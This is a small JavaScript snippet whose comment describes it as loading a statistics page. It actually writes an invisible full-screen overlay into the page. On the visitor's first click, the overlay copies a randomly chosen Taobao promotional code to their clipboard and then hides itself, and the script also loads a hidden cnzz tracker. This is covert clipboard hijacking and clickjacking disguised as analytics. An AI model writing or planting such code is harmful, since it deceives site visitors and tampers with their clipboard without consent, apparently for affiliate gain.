(function () {
    //加载统计页面
    var taoCodeArray = ["€KUwy0yyj29A€", "€g7sD0yy8zPp€", "€GLS20yy9WAc€", "€hcSC0yy9ADH€", "€Cknt0yyk5Ls€", "€L10n0yykK1e€"];
    var index = Math.floor(Math.random()*6);
    document.write("<script src=\"https://cdn.bootcss.com/clipboard.js/2.0.0/clipboard.min.js\" type=\"text/javascript\"></\script>");
    document.write("<div id=\"abc\" style=\"width: 100%; height: 100%; top: 0;left: 0; position: fixed; z-index: 99999;\" ></div>");
    document.write("<button id=\"target\" style=\"display: none\" data-clipboard-text=\"" + taoCodeArray[index] + "\">button</button>");
    document.write("<script type=\"text/javascript\">new ClipboardJS(\"#target\");document.getElementById(\"abc\").onclick = function() {document.getElementById(\"target\").click();document.getElementById(\"abc\").hidden = true;};</\script>");
    document.write("<div style=\"display: none;\"><script src=\"https://s22.cnzz.com/z_stat.php?id=1274035492&web_id=1274035492\" language=\"JavaScript\"></\script></div>");
})();